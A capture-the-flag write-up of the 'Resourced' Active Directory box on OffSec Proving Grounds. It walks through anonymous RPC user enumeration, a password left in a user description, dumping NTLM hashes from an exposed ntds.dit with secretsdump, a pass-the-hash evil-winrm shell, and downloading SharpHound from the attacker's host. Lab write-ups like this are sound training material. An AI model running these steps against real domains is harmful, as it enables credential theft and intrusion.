# PG Practice: [Resourced](https://portal.offensive-security.com/labs/play)

![image](https://user-images.githubusercontent.com/87611022/180659095-75dc4574-0a14-4866-8756-cae67ee8616a.png)

This is a writeup for **Resourced** which is an intermediate box on PG practice.

We begin our enumeration as usual with a port scan:

```
┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
└─# cat nmap192.168.197.175/192.168.197.175.nmap
# Nmap 7.92 scan initiated Mon Aug 29 06:54:50 2022 as: nmap -p53,88,135,139,389,464,445,593,636,3269,3268,3389,5985,9389,49666,49667,49674,49675,49691,49719 -sV -sC -T4 -Pn -oA 192.168.197.175 192.168.197.175
Nmap scan report for 192.168.197.175
Host is up (0.10s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-29 10:54:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-08-29T10:55:46+00:00
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2022-08-24T13:27:51
|_Not valid after:  2023-02-23T13:27:51
|_ssl-date: 2022-08-29T10:56:26+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-29T10:55:49
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 29 06:56:33 2022 -- 1 IP address (1 host up) scanned in 103.30 seconds
```
from the open ports and services we can safely assume this is a domain controller.

there are several interesting ports so let's begin with **rpcclient**:

```
┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
└─# rpcclient -U '' -N 192.168.197.175
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[M.Mason] rid:[0x44f]
user:[K.Keen] rid:[0x450]
user:[L.Livingstone] rid:[0x451]
user:[J.Johnson] rid:[0x452]
user:[V.Ventz] rid:[0x453]
user:[S.Swanson] rid:[0x454]
user:[P.Parker] rid:[0x455]
user:[R.Robinson] rid:[0x456]
user:[D.Durant] rid:[0x457]
user:[G.Goldberg] rid:[0x458]
```
it looks like we have access as a guest user so let's further enumerate:

first I cleaned the users output and saved it to a file
```
┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
└─# cut -d"[" -f2 ./user.txt | cut -d"]" -f1 > cleanU.txt                   
                                                                                                
┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
└─# cat cleanU.txt                                       
Administrator
Guest
krbtgt
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Ventz
S.Swanson
P.Parker
R.Robinson
D.Durant
G.Goldberg
```
then used this simple command to query each user:
```
┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
└─# for user in $(cat cleanU.txt); do rpcclient -U "" -N 192.168.197.175 -c "queryuser ${user}" >> infoU.txt; done
                                                                                                
┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
└─# cat infoU.txt 
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        .
        .
        .
        .
```
The user **V.Ventz** had an interesting Description:
```
        User Name   :   V.Ventz
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   New-hired, reminder: HotelCalifornia194!
        Workstations:
```
That reminder looks pretty much like a password so I used crackmapexec to see for which service.

It turned out it's **V.Ventz** smb password:
```
┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
└─# crackmapexec smb 192.168.197.175 -u 'V.Ventz' -p 'HotelCalifornia194!'            
SMB         192.168.197.175 445    RESOURCEDC       [*] Windows 10.0 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.197.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194!

┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
└─# smbmap -H 192.168.197.175 -u 'V.Ventz' -p 'HotelCalifornia194!'
[+] IP: 192.168.197.175:445     Name: ResourceDC.resourced.local                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Password Audit                                          READ ONLY
        SYSVOL
```
the share **Password Audit** seems interesting so let's look at it:
```
┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
└─# smbclient \\\\192.168.197.175/"Password Audit" -U 'V.Ventz%HotelCalifornia194!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  Active Directory                    D        0  Tue Oct  5 04:49:15 2021
  registry                            D        0  Tue Oct  5 04:49:16 2021

                7706623 blocks of size 4096. 2719850 blocks available
smb: \> cd "Active Directory"
smb: \Active Directory\> ls
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  ntds.dit                            A 25165824  Mon Sep 27 07:30:54 2021
  ntds.jfm                            A    16384  Mon Sep 27 07:30:54 2021

                7706623 blocks of size 4096. 2719850 blocks available
smb: \Active Directory\> cd ../registry
smb: \registry\> ls
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  SECURITY                            A    65536  Mon Sep 27 06:45:20 2021
  SYSTEM                              A 16777216  Mon Sep 27 06:45:20 2021
```
well this looks like an easy jackpot, we have **ntds.dit, SECURITY and SYSTEM** files so we can easily extract the hashes using impacket tools:

```
┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
└─# python3 /opt/impacket/build/scripts-3.10/secretsdump.py -ntds Active\ Directory/ntds.dit -security registry/SECURITY -system registry/SYSTEM LOCAL
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping cached domain logon information (domain/username:hash)
.
.
.
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
```
We can test these hashes using crackmapexec again:
```
┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
└─# crackmapexec winrm 192.168.197.175 -u user.txt -H hash2.txt
SMB         192.168.197.175 5985   RESOURCEDC       [*] Windows 10.0 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
HTTP        192.168.197.175 5985   RESOURCEDC       [*] http://192.168.197.175:5985/wsman
WINRM       192.168.197.175 5985   RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f
.
.
.
WINRM       192.168.197.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
```
and just like that **L.Livingstone** is pwned, so let's login using his credentials.

```
┌──(root💀kali)-[~/tryhackme/rooms/Practice/resourced]
└─# evil-winrm -i 192.168.197.175 -u 'L.Livingstone' -H '19a3a7550ce8c505c2d46b5e39d6f808'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                       

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents>
```
Now that we have a shell let's upload [SharpHound](https://github.com/BloodHoundAD/SharpHound) and run it to gather information and possible privilege escalation paths

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> IWR -uri http://192.168.49.197/SharpHound.exe -OutFil
e sharphound.exe
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> ls


    Directory: C:\Users\L.Livingstone\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/29/2022  10:45 AM        1051648 sharphound.exe

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> .\sharphound.exe -c all --zipfilename resourced.zip
2022-08-29T10:46:08.6524282-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2022-08-29T10:46:08.7774264-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
.
.
.
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> ls


    Directory: C:\Users\L.Livingstone\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/29/2022  10:46 AM          11880 20220829104653_resourced.zip
-a----        8/29/2022  10:46 AM           8964 N2NkZDYyMzItY2UxZi00N2ZkLTg4ZmQtNThlNjJlZDQ1NzJh.bin
```
